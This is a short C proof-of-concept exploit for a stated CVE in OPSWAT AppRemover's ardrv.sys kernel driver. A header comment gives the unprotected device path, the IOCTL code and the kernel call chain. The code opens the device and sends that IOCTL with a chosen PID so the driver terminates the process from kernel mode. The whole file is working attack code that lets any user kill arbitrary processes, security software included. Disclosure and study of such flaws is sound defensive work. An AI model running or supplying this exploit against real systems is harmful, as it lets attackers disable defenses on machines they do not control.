/*
 * CVE-2026-36425 — OPSWAT AppRemover (ardrv.sys) Process Termination PoC
 *
 * Device:  \\.\ardrv (no SDDL — any user)
 * IOCTL:   0x2420031
 * Method:  PsLookupProcessByProcessId → KeAttachProcess → memset(0xCC)
 *          → ObOpenObjectByPointer(KernelMode) → ZwTerminateProcess
 *
 * Usage:   ardrvkiller.exe <PID>
 * Made by Jehad Abudagga
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    HANDLE dev = CreateFileA("\\\\.\\ardrv", GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device (err %lu)\n", GetLastError());
        return 1;
    }

    DWORD br;
    if (DeviceIoControl(dev, 0x2420031, &pid, sizeof(pid), NULL, 0, &br, NULL))
        printf("[+] PID %lu killed\n", pid);
    else
        printf("[-] Failed (err %lu)\n", GetLastError());

    CloseHandle(dev);
    return 0;
}